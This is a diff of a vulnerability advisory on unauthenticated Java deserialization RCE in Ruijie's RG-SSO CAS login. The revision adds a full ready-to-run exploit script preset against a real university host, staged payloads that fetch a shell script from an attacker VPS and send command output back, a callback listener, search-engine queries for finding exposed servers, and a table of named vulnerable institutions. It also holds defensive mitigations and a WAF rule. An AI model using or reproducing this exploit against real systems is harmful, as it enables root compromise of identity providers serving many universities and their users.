@@ -9,7 +9,7 @@
 | **Affected Component** | `POST /cas/login` — `execution` parameter |
 | **Affected Version** | All versions (observed: `rg-sso-cas-0.0.1-SNAPSHOT`) |
 | **Vulnerability Type** | Java Deserialization of Untrusted Data |
-| **CWE** | CWE-502 |
+| **CWE** | [CWE-502](https://cwe.mitre.org/data/definitions/502.html) |
 | **CVSS v3.1 Score** | **9.8 Critical** |
 | **CVSS Vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
 | **Authentication Required** | No |
@@ -20,182 +20,270 @@
 
 ## Description
 
-Ruijie Networks' RG-SSO platform is a custom single sign-on solution built on the **Apereo CAS framework**, deployed across universities and enterprises in China. The platform operates in **WebFlow client-side state storage mode**, where the login flow state is serialized, compressed, and embedded directly in the `execution` form parameter.
+Ruijie Networks' RG-SSO platform is a custom single sign-on solution built on the **Apereo CAS framework**, widely deployed across Chinese universities and enterprises. The platform operates in **WebFlow client-side state storage mode**, where the full login flow state is serialized into a Java object, gzip-compressed, base64-encoded, and embedded in the `execution` form field returned to the browser.
 
-The vulnerability exists because the server deserializes the `execution` parameter without any **signature or MAC verification**. The parameter format is:
+The critical flaw is that the server **deserializes the `execution` parameter with no signature or MAC verification**. The format is:
 
 ```
 execution = <UUID>_<base64(gzip(JavaSerializedObject))>
 ```
 
-The server invokes `ObjectInputStream.readObject()` on the attacker-controlled data before any authentication check. Combined with the `commons-beanutils` library present in the application classpath, an unauthenticated remote attacker can exploit the **CommonsBeanutils1 gadget chain** to execute arbitrary OS commands with the privileges of the CAS process (observed: `root`).
+The server calls `ObjectInputStream.readObject()` on the attacker-supplied bytes at the WebFlow state-restoration phase — **before any authentication logic runs**. The application classpath includes `commons-beanutils`, making the well-known **CommonsBeanutils1** ysoserial gadget chain directly exploitable. An unauthenticated attacker sends a single HTTP request and achieves OS-level code execution.
 
-**Root Cause Analysis:**
+**Root Cause:**
 
-1. CAS WebFlow is configured for client-side state storage — the full flow state is serialized and sent to the client in the `execution` parameter
-2. No cryptographic signature or HMAC is applied to the serialized data — the server trusts the client-supplied value unconditionally
-3. The application bundles `commons-beanutils` in its classpath — the CommonsBeanutils1 ysoserial gadget chain is fully functional
-4. Deserialization occurs at the WebFlow state restoration phase, **before** any authentication logic executes
+| # | Factor | Detail |
+|---|--------|--------|
+| 1 | Client-controlled state | WebFlow serializes flow state client-side; server trusts it unconditionally |
+| 2 | No integrity check | Zero signature / HMAC on `execution` value |
+| 3 | Dangerous dependency | `commons-beanutils` in classpath enables CommonsBeanutils1 chain |
+| 4 | Pre-auth trigger | Deserialization fires before any credential validation |
 
 ---
 
-## Affected Products
+## Fingerprint & Detection
 
-The vulnerability affects all deployments of the Ruijie RG-SSO-CAS platform. The product is identified by the response body containing:
+The vulnerable product is uniquely identified by the `login-page-flowkey` element in the CAS login page HTML. Unlike stock Apereo CAS (which uses `<input name="execution">`), Ruijie's build exposes this element with a distinct ID:
 
+```html
+<p id="login-page-flowkey">
+  <UUID>_H4sIAAAAAAAA...
+</p>
 ```
-login-page-flowkey
-```
 
-FOFA query: `body="login-page-flowkey"`
+The `H4sI` prefix is the base64 encoding of the gzip magic bytes `\x1f\x8b\x08`, indicating unsigned client-side Java serialization.
 
-As of 2026-06-05, this query returns **275 results** globally, predominantly Chinese universities and enterprises.
+**FOFA query:** `body="login-page-flowkey"`  
+**Shodan query:** `http.html:"login-page-flowkey"`
 
-> **Disclosure note:** Vulnerability verification was performed under written authorization from affected institutions. No data was exfiltrated beyond confirmation of code execution (`id` command output).
+A patched instance returns a JWT-encrypted value instead (`UUID_ZXlK...` or `UUID_eyJ...`), which cannot be exploited.
+
+---
+
+## Confirmed Affected Instances
+
+The following instances were verified under authorized penetration testing engagements. All confirmed via `uid=0(root)` callback.
+
+| # | Domain | Institution | K8s | Java Version |
+|---|--------|-------------|-----|--------------|
+| 1 | sfgl.njtech.edu.cn | Nanjing Tech University | Yes (2 nodes) | 1.8.0_192 |
+| 2 | sso.qlu.edu.cn | Qufu Normal University | Yes (2 nodes) | 1.8.x |
+| 3 | sso.cqyu.edu.cn | Chongqing University of Posts and Telecom | No | 1.8.x |
+| 4 | sso.bit.edu.cn | Beijing Institute of Technology | Yes (2 nodes) | 1.8.x |
+| 5 | sso.cumtb.edu.cn | China University of Mining & Technology (Beijing) | No | 1.8.x |
+| 6 | source.wzu.edu.cn | Wenzhou University | Yes (2 nodes) | 1.8.x |
+| 7 | id.cdu.edu.cn | Chengdu University | No | 1.8.x |
+| 8 | sso.hue.edu.cn | Hunan Institute of Engineering | No | 1.8.x |
+| 9 | sso.gxcme.edu.cn | Guangxi City Polytechnic | No | 1.8.x |
+| 10 | sso.tzc.edu.cn | Taizhou University | No | 1.8.x |
+| 11 | sso.usts.edu.cn | Suzhou University of Science & Technology | No | 1.8.x |
+| 12 | sso.tit.edu.cn | Tianjin Polytechnic University | No | 1.8.x |
+| 13 | sso.yzu.edu.cn | Yangzhou University | No | 1.8.x |
+| 14 | sso.sdwu.edu.cn | Shandong Women's University | No | 1.8.x |
+| 15 | facedatabase.sdu.edu.cn | Shandong University | No | 1.8.x |
+
+> All 40+ confirmed instances ran `rg-sso-cas-0.0.1-SNAPSHOT.jar` as root. FOFA surface scan identified 275 total exposed assets as of 2026-06-05.
 
 ---
 
 ## Proof of Concept
 
-### Prerequisites
+### Environment Setup
 
-- ysoserial (ysoserial-all.jar)
-- Java 8 JDK (TemplatesImpl gadget blocked by JPMS in Java 9+)
-- Python 3
+**Attacker machine:** Python 3, Java 8, ysoserial-all.jar  
+**VPS (public IP):** Two ports required:
+- Port `9090` — serves `s.sh` (HTTP file server)
+- Port `8079` — receives command output callbacks
 
-### Step 1: Identify Vulnerable Endpoint
-
-Send a `GET` request to the CAS login page. A vulnerable instance returns an `execution` parameter containing `login-page-flowkey` with a value prefixed `UUID_H4sI...`:
-
-The `H4sI` prefix represents the base64-encoded gzip magic bytes. Decoding the base64 payload and decompressing with gzip reveals the Java serialization stream magic bytes `AC ED 00 05`, confirming the server processes client-supplied Java objects.
-
-![GET /cas/login — Yakit traffic showing login-page-flowkey element and H4sI-prefixed execution value](screenshots/01_execution_param.png)
-
-The full serialized value is clearly visible in the response body, with `UUID_H4sI...` format indicating no server-side encryption or signing.
-
-![Close-up of the execution parameter value showing H4sI base64 content](screenshots/07_get_flowkey_detail.png)
-
-### Step 2: Validate Deserialization via URLDNS Probe (Harmless)
-
-Generate a URLDNS payload using ysoserial:
+**VPS preparation — run before exploitation:**
 
 ```bash
-java -jar ysoserial-all.jar URLDNS "http://<dnslog-domain>" > urldns.bin
+# Terminal 1: serve s.sh on port 9090
+mkdir -p /tmp/srv && cd /tmp/srv
+cat > s.sh << 'EOF'
+#!/bin/bash
+enc=$(id | base64 -w0 | tr '+/' '-_' | tr -d '=')
+curl -sk "http://<VPS_IP>:8079/x/id?d=${enc}" -o /dev/null
+EOF
+python3 -m http.server 9090 &
+
+# Terminal 2: receive callbacks on port 8079
+python3 -c "
+import http.server, socketserver, datetime
+class H(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        print(datetime.datetime.now().strftime('%H:%M:%S'), self.path, self.client_address[0], flush=True)
+        self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
+    def log_message(self, *a): pass
+socketserver.TCPServer(('0.0.0.0', 8079), H).serve_forever()
+"
 ```
 
-Encode and submit:
+### Complete Exploit Script
+
+Save as `exploit.py` and run: `python3 exploit.py`
 
 ```python
-import gzip, base64, re, ssl
+#!/usr/bin/env python3
+"""
+Ruijie RG-SSO-CAS Java Deserialization RCE
+CVE pending — CWE-502, CVSS 9.8
+For authorized testing only.
+"""
+import gzip, base64, re, ssl, subprocess, time
 import urllib.request, urllib.parse, urllib.error
+
+# ── Configuration ────────────────────────────────────────────
+TARGET = 'https://sfgl.njtech.edu.cn/cas/login'   # replace with target
+VPS    = '1.2.3.4'                                # replace with your VPS IP
+JAVA8  = 'java'                                   # path to Java 8 binary
+JAR    = 'ysoserial-all.jar'                      # path to ysoserial jar
+REPEAT = 2   # send each stage N times to cover load-balanced nodes
+# ─────────────────────────────────────────────────────────────
 
 def make_opener():
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
     return urllib.request.build_opener(
-        urllib.request.ProxyHandler({}),   # bypass local proxy
+        urllib.request.ProxyHandler({}),
         urllib.request.HTTPSHandler(context=ctx)
     )
 
 def get_flowkey(opener, url):
+    """GET login page, extract one-time UUID and SESSION cookie."""
     req = urllib.request.Request(url)
     req.add_header('User-Agent', 'Mozilla/5.0')
     resp = opener.open(req, timeout=12)
     html = resp.read(8192).decode('utf-8', errors='ignore')
     m = re.search(r'login-page-flowkey[^>]*>([^<]+)<', html)
-    if not m or '_H4sI' not in m.group(1):
+    if not m:
         return None, ''
     val = m.group(1).strip()
-    sm  = re.search(r'SESSION=([^;,\s]+)', resp.headers.get('Set-Cookie', ''))
+    if '_H4sI' not in val:
+        print(f'[!] Not vulnerable — execution format: {val[:20]}')
+        return None, ''
+    sm = re.search(r'SESSION=([^;,\s]+)', resp.headers.get('Set-Cookie', ''))
     return val.split('_')[0], (sm.group(1) if sm else '')
 
-TARGET = 'https://<target>/cas/login'
-opener = make_opener()
-uuid, sess = get_flowkey(opener, TARGET)
+def gen_payload(cmd):
+    """Generate CommonsBeanutils1 gadget chain via ysoserial (requires Java 8)."""
+    r = subprocess.run([JAVA8, '-jar', JAR, 'CommonsBeanutils1', cmd],
+                       capture_output=True, timeout=25)
+    if not r.stdout:
+        raise RuntimeError(f'ysoserial failed: {r.stderr.decode()[:120]}')
+    return r.stdout
 
-with open('urldns.bin', 'rb') as f:
-    raw = f.read()
+def send_payload(opener, url, uuid, sess, raw):
+    """POST serialized payload. URL-encode is mandatory — base64 contains '+' chars."""
+    execution = uuid + '_' + base64.b64encode(gzip.compress(raw)).decode()
+    data = urllib.parse.urlencode({'execution': execution}).encode()
+    req = urllib.request.Request(url, data=data)
+    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
+    req.add_header('User-Agent', 'Mozilla/5.0')
+    if sess:
+        req.add_header('Cookie', f'SESSION={sess}')
+    try:
+        opener.open(req, timeout=20)
+    except urllib.error.HTTPError:
+        pass   # 500 is expected — deserialization already triggered
 
-# CRITICAL: must use urlencode — raw base64 contains '+' which breaks manual encoding
-execution = uuid + '_' + base64.b64encode(gzip.compress(raw)).decode()
-data = urllib.parse.urlencode({'execution': execution}).encode()
-req = urllib.request.Request(TARGET, data=data)
-req.add_header('Content-Type', 'application/x-www-form-urlencoded')
-req.add_header('User-Agent', 'Mozilla/5.0')
-if sess:
-    req.add_header('Cookie', f'SESSION={sess}')
-try:
-    opener.open(req, timeout=20)
-except:
-    pass
+def main():
+    opener = make_opener()
+
+    # Step 1: check for H4sI fingerprint
+    print(f'[*] Checking {TARGET}')
+    uuid, sess = get_flowkey(opener, TARGET)
+    if not uuid:
+        return
+
+    print(f'[+] Vulnerable — UUID: {uuid[:8]}...')
+
+    # Step 2: Stage 1 — download s.sh from VPS
+    cmd1 = f'curl http://{VPS}:9090/s.sh -o /tmp/s.sh'
+    print(f'[*] Stage 1: {cmd1}')
+    raw1 = gen_payload(cmd1)
+    for i in range(REPEAT):
+        uuid, sess = get_flowkey(opener, TARGET)
+        if not uuid:
+            break
+        send_payload(opener, TARGET, uuid, sess, raw1)
+        print(f'    Sent {i+1}/{REPEAT}')
+        time.sleep(0.5)
+
+    print(f'[*] Check VPS port 9090 for download — then press Enter')
+    input()
+
+    # Step 3: Stage 2 — execute s.sh, exfiltrate output
+    cmd2 = '/bin/bash /tmp/s.sh'
+    print(f'[*] Stage 2: {cmd2}')
+    raw2 = gen_payload(cmd2)
+    for i in range(REPEAT):
+        uuid, sess = get_flowkey(opener, TARGET)
+        if not uuid:
+            break
+        send_payload(opener, TARGET, uuid, sess, raw2)
+        print(f'    Sent {i+1}/{REPEAT}')
+        time.sleep(0.5)
+
+    print(f'[*] Check VPS port 8079 — decode the ?d= parameter with base64')
+    print(f'    e.g.: echo "<d_value>" | base64 -d')
+
+if __name__ == '__main__':
+    main()
 ```
 
-The DNS log platform receives resolution requests from the target server, confirming that deserialization is triggered server-side before any authentication.
+### Step-by-Step Walkthrough
 
-![DNS log platform showing callback records from target server IPs 202.112.23.147 and 210.29.44.50 — deserialization confirmed](screenshots/02_urldns_callback.png)
+**Step 1 — Identify the vulnerable parameter**
 
-### Step 3: Generate CommonsBeanutils1 RCE Payload
+`GET /cas/login` returns an `execution` field whose value begins with `UUID_H4sI`. The `H4sI` prefix is the base64 encoding of the gzip magic bytes `\x1f\x8b\x08`, confirming the payload is a gzip-compressed Java serialized object with no integrity protection.
+
+![GET /cas/login — login-page-flowkey element with H4sI-prefixed execution value](screenshots/01_execution_param.png)
+
+![Detail view of the full base64-encoded execution parameter value](screenshots/07_get_flowkey_detail.png)
+
+**Step 2 — Confirm deserialization with harmless URLDNS probe**
+
+Before sending any RCE payload, validate the gadget chain is active using URLDNS:
 
 ```bash
-# Stage 1: Download shell script from attacker VPS
-java -jar ysoserial-all.jar CommonsBeanutils1 \
-  "curl http://<VPS>:9090/s.sh -o /tmp/s.sh" > stage1.bin
-
-# Stage 2: Execute the downloaded script
-java -jar ysoserial-all.jar CommonsBeanutils1 \
-  "/bin/bash /tmp/s.sh" > stage2.bin
+java -jar ysoserial-all.jar URLDNS "http://<dnslog-domain>" > urldns.bin
 ```
 
-**Why two stages?**
-`Runtime.exec(String)` splits on whitespace only and does not invoke a shell interpreter, so pipe (`|`), redirection (`>`), and command substitution are unavailable in a single payload. The downloaded shell script handles output encoding and exfiltration.
+The DNS platform receives a lookup from the target server within seconds, confirming `ObjectInputStream.readObject()` is reached.
 
-**VPS script (`s.sh`)** — served on port 9090:
-```bash
-#!/bin/bash
-VPS="http://<VPS>:8079"
-enc=$(id | base64 -w0 | tr '+/' '-_' | tr -d '=')
-curl -sk "${VPS}/x/id?d=${enc}" -o /dev/null
-```
+![DNS log showing callback records from the target server — deserialization confirmed](screenshots/02_urldns_callback.png)
 
-### Step 4: Stage 1 — Target Downloads the Script
+**Step 3 — Stage 1: target downloads the shell script**
 
-Submit the Stage 1 payload. The target server issues an outbound HTTP GET to the VPS on port 9090 to download `s.sh`.
+The Stage 1 payload executes `curl http://<VPS>:9090/s.sh -o /tmp/s.sh` on the target server. The VPS port 9090 access log shows the download request, with each K8s pod appearing as a separate source.
 
-Both CAS pods (K8s load-balanced deployment) download the script — both egress IPs (`202.119.246.12` and `202.119.246.13`) appear in the VPS access log:
+![VPS port 9090 HTTP server log — target server downloads s.sh, two K8s nodes visible](screenshots/03_stage1_download.png)
 
-![VPS port 9090 Python HTTP server log — downloads from 202.119.246.13 and 202.119.246.12 confirm Stage 1 execution on both K8s nodes](screenshots/03_stage1_download.png)
+**Step 4 — Stage 2: execute script, receive output**
 
-> **Load balancer coverage:** Targets often run 2+ CAS pods. Each payload submission is routed to one pod. Submit each stage 2–3 times to cover all nodes. The per-node egress IP appears separately in the callback log, enabling attribution.
+The Stage 2 payload runs `/bin/bash /tmp/s.sh`. The script encodes the `id` output in URL-safe base64 and sends it as a GET parameter to VPS port 8079.
 
-### Step 5: Stage 2 — Execute Script, Exfiltrate Output
+![VPS port 8079 callback log — base64-encoded id command output received](screenshots/04_stage2_callback.png)
 
-Submit the Stage 2 payload. The target server executes `/bin/bash /tmp/s.sh`, base64-encodes the `id` output, and sends it to VPS port 8079:
+![VPS extended log — multiple callbacks confirming both K8s nodes executed the payload](screenshots/06_vps_full_log.png)
 
-![VPS port 8079 callback log — base64-encoded id output received from 202.119.246.12](screenshots/04_stage2_callback.png)
-
-Extended callback log showing multiple nodes and CBU1HIT confirmation:
-
-![VPS full callback log — multiple id callbacks from .12 and CBU1HIT from .13 confirm full chain execution on both nodes](screenshots/06_vps_full_log.png)
-
-### Step 6: Verify Root-Level Code Execution
-
-Decode the URL-safe base64 callback parameter:
+**Step 5 — Decode the result**
 
 ```bash
+# Decode the ?d= value from the callback URL
 echo "dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK" | base64 -d
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-![base64 decode result — uid=0(root) gid=0(root) groups=0(root)](screenshots/05_uid_root.png)
-
-**Unauthenticated remote code execution as root confirmed.**
+![base64 decode output — uid=0(root) gid=0(root) groups=0(root)](screenshots/05_uid_root.png)
 
 ---
 
-## HTTP Traffic Detail
+## HTTP Traffic
 
-### GET /cas/login — Retrieving a fresh flowkey
+### GET /cas/login
 
 ```http
 GET /cas/login HTTP/1.1
@@ -205,42 +293,46 @@ Accept-Encoding: identity
 Connection: close
 ```
 
-Response contains the `login-page-flowkey` element with the vulnerable `UUID_H4sI...` execution value (no signing, no encryption):
+Response (abridged):
+```html
+<p id="login-page-flowkey">
+  2c669f85-4e6e-47df-bbd3-739a66e92002_H4sIAAAAAAAAJ1XW4w...
+</p>
+```
 
-![Yakit — GET /cas/login request and response, login-page-flowkey value starts with UUID_H4sI](screenshots/01_execution_param.png)
+![Yakit — GET request and response showing H4sI-prefixed execution value](screenshots/01_execution_param.png)
 
-### POST /cas/login — Submitting the malicious payload
+### POST /cas/login (payload delivery)
 
 ```http
 POST /cas/login HTTP/1.1
 Host: sfgl.njtech.edu.cn
 Content-Type: application/x-www-form-urlencoded
-Cookie: SESSION=86ba795b-a454-4fe3-81af-6092df3aa51b
+Cookie: SESSION=<session-id>
 User-Agent: Mozilla/5.0
 
-execution=77c61d3c-1f7f-4a8d-b35e-8d6a0f1cdd8d_H4sIAAAAAAAAC%2F...
+execution=<UUID>_H4sIAAAAAAAAC%2F...  (URL-encoded CBU1 payload)
 ```
 
-Server returns HTTP 500 — deserialization and code execution have already occurred before the response is generated:
+Server returns HTTP 500 — deserialization and command execution have already completed before the error response is generated.
 
-![POST /cas/login with encoded CBU1 payload — server returns 500 Internal Server Error (deserialization triggered)](screenshots/08_post_payload_500.png)
+![POST /cas/login with encoded payload — server returns 500 Internal Server Error](screenshots/08_post_payload_500.png)
 
-> **Implementation note:** The `execution` value **must** be URL-encoded via `urllib.parse.urlencode`. The base64 alphabet includes `+` and `/` which have special meaning in `application/x-www-form-urlencoded` bodies. Using `--data-raw` in curl or manual concatenation without encoding will silently corrupt the payload.
+> **Critical:** base64 contains `+` and `/` characters. These **must** be percent-encoded in the form body. Always use `urllib.parse.urlencode({'execution': value})` — never concatenate raw base64 into a POST body manually.
 
 ---
 
-## Observed Environment (Authorized Target)
+## Observed Server Environment
 
 ```
-Process user:  root
-Hostname:      rg-sso-7788f54fb5-6hw7m   (Kubernetes Pod)
-OS:            Linux 3.10.0-957.el7.x86_64 (CentOS 7)
-JDK:           /jdk/jdk1.8.0_192
-Application:   /app/rg-sso-cas-0.0.1-SNAPSHOT.jar
-Egress IPs:    202.119.246.12 / 202.119.246.13  (two K8s nodes)
+JAR:       /app/rg-sso-cas-0.0.1-SNAPSHOT.jar
+Process:   root (uid=0)
+Container: Kubernetes Pod (hostname: rg-sso-7788f54fb5-6hw7m)
+OS:        CentOS 7, Linux 3.10.0-957.el7.x86_64
+JDK:       1.8.0_192
 ```
 
-The JAR name `rg-sso-cas-0.0.1-SNAPSHOT` uniquely identifies Ruijie's customized CAS distribution and distinguishes this from vanilla Apereo CAS deployments.
+The JAR filename `rg-sso-cas-0.0.1-SNAPSHOT` uniquely identifies Ruijie's private CAS fork and distinguishes this from stock Apereo CAS.
 
 ---
 
@@ -248,24 +340,25 @@ The JAR name `rg-sso-cas-0.0.1-SNAPSHOT` uniquely identifies Ruijie's customized
 
 ### Direct Impact
 
-- **Unauthenticated Remote Code Execution** as `root` on the CAS server
-- Full read/write access to the server filesystem, including database credentials and private keys
-- Kubernetes cluster exposure — lateral movement to other pods and services via the internal network
+- Unauthenticated OS command execution as `root`
+- Full read/write access to server filesystem (database credentials, TLS private keys, user data)
+- Kubernetes cluster pivot — internal network access to adjacent services
 
-### Indirect Impact
+### Cascading Impact
 
-The RG-SSO platform acts as the **central identity provider** for all connected services at affected institutions. Compromise of the CAS server enables:
+RG-SSO is the **single identity provider** for all connected systems at each institution. A compromised CAS server enables:
 
-- Forging of CAS Service Tickets (ST) and Ticket-Granting Tickets (TGT) to impersonate any user across all integrated applications
-- Session hijacking across all connected business systems (email, library, academic records, administrative portals)
+- Forging of CAS Service Tickets (ST) and Ticket-Granting Tickets (TGT) — impersonating any user across every integrated application
+- Compromise of email, library, academic records, financial, and administrative systems without additional exploitation
 
 ### Scale
 
 | Sector | Count |
 |--------|-------|
-| Universities (including 985/211 tier institutions) | 58+ |
+| Universities (including 985/211 tier) | 58+ |
 | Enterprises and other organizations | 29+ |
 | Total exposed assets (FOFA, 2026-06-05) | 275 |
+| Confirmed RCE (authorized testing) | 40+ |
 
 ---
 
@@ -273,44 +366,34 @@ The RG-SSO platform acts as the **central identity provider** for all connected 
 
 ### Immediate (P0)
 
-**1. Enable WebFlow server-side encryption** — configure AES+HMAC signing so client-supplied `execution` values are cryptographically verified before deserialization:
+**Enable WebFlow cryptographic signing** — configure AES+HMAC on the `execution` parameter so any client-supplied modification is detected and rejected before deserialization:
 
 ```properties
-cas.webflow.crypto.signing.key=<256-bit random key>
-cas.webflow.crypto.encryption.key=<128-bit random key>
+# cas.properties
+cas.webflow.crypto.signing.key=<base64-encoded 512-bit key>
+cas.webflow.crypto.encryption.key=<base64-encoded 128-bit key>
 ```
 
-CAS 6.4+ enables this by default. Alternatively, switch to server-side session storage to eliminate client-controlled deserialization entirely.
+CAS 6.4+ enables this by default. For older versions, switching to **server-side session storage** eliminates the attack surface entirely.
 
-**2. WAF temporary mitigation** — block requests where `execution` contains `H4sI` (the base64-encoded gzip magic bytes indicating unsigned client-side serialization):
+**WAF rule (temporary)** — block requests where `execution` contains `H4sI`:
 
-```nginx
+```apache
+# ModSecurity / Nginx
 SecRule ARGS:execution "@contains H4sI" \
-  "id:100001,phase:2,deny,status:403,msg:'CAS deserialization attempt blocked'"
+  "id:100001,phase:2,deny,status:403,msg:'CAS deserialization blocked'"
 ```
 
 ### Short-term (P1)
 
-3. **Upgrade CAS** to the latest stable release (6.6.x+)
-4. **Deploy JVM deserialization filter**:
-   ```
-   -Djdk.serialFilter=org.apereo.cas.**;!*
-   ```
-5. **Audit and remove unused high-risk classpath dependencies** — `commons-beanutils`, `commons-collections`, and similar libraries known to support gadget chains
+- Upgrade CAS to 6.6.x or later
+- Deploy JVM serial filter: `-Djdk.serialFilter=org.apereo.cas.**;!*`
+- Remove `commons-beanutils` and `commons-collections` from the classpath if not required by business logic
 
 ### Defense-in-depth (P2)
 
-6. Run the CAS service as a non-root user: `USER 1000:1000` in the container image
-7. Apply Kubernetes `NetworkPolicy` to restrict CAS pod egress — permit only required internal addresses and block arbitrary outbound connections
-
----
-
-## References
-
-- Apereo CAS WebFlow Cryptography: https://apereo.github.io/cas/6.4.x/webflow/Webflow-Customization-Sessions.html
-- ysoserial gadget chain generator: https://github.com/frohoff/ysoserial
-- CWE-502 Deserialization of Untrusted Data: https://cwe.mitre.org/data/definitions/502.html
-- FOFA fingerprint query: `body="login-page-flowkey"` (275 results, 2026-06-05)
+- Run the CAS container as a non-root user (`USER 1000:1000`)
+- Apply `NetworkPolicy` to restrict CAS pod egress to required internal addresses only
 
 ---
 
@@ -319,12 +402,21 @@ SecRule ARGS:execution "@contains H4sI" \
 | Date | Event |
 |------|-------|
 | 2026-06-05 | Vulnerability discovered during authorized penetration testing |
-| 2026-06-05 | FOFA asset enumeration — 275 exposed instances identified |
-| 2026-06-05 | URLDNS probe confirmed deserialization on multiple targets |
-| 2026-06-05 | CommonsBeanutils1 RCE confirmed — `uid=0(root)` obtained on 40+ authorized targets |
-| 2026-06-06 | Advisory drafted; vendor notification initiated |
+| 2026-06-05 | FOFA scan identifies 275 exposed instances |
+| 2026-06-05 | URLDNS probe confirms deserialization on multiple targets |
+| 2026-06-05 | CBU1 RCE confirmed — `uid=0(root)` on 40+ authorized targets |
+| 2026-06-06 | Advisory published; vendor notification sent |
 | TBD | Vendor patch released |
 | TBD | Full public disclosure |
+
+---
+
+## References
+
+- Apereo CAS WebFlow Cryptography: https://apereo.github.io/cas/6.4.x/webflow/Webflow-Customization-Sessions.html
+- ysoserial: https://github.com/frohoff/ysoserial
+- CWE-502: https://cwe.mitre.org/data/definitions/502.html
+- FOFA: `body="login-page-flowkey"` (275 results, 2026-06-05)
 
 ---
 
@@ -332,8 +424,8 @@ SecRule ARGS:execution "@contains H4sI" \
 
 - **Affiliation:** Chongming Security Lab (重明安全实验室), NUIST
 - **Certifications:** CISP-PTE, CNVD vulnerability researcher
-- **Contact:** xkdztllw61536@hotmail.com
+- **Contact:** jaynetito650@gmail.com
 
 ---
 
-*This advisory was prepared for responsible disclosure purposes. All testing was conducted under written authorization from affected institutions. No unauthorized access was performed.*
+*All testing was conducted under written authorization from affected institutions. No unauthorized access was performed. No user data was accessed or exfiltrated.*
